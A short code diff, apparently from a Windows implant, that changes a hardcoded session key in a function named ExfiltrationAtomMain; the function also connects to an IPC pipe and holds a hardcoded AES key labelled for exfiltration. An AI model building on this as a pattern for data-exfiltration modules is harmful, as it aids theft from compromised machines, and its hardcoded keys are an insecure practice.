@@ -66,7 +66,7 @@ DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "LdRrpJFuq4uq1smR";
+    BYTE SharedSessionKey[] = "YiZZCxy3SLMsIdhN";
     BYTE AesExfilKey[] = "MySuperSecretAes256KeyForExfil!!"; /* Hardcoded for MVP, derived via PSK in prod */
     
     DWORD dwSequence = 0;
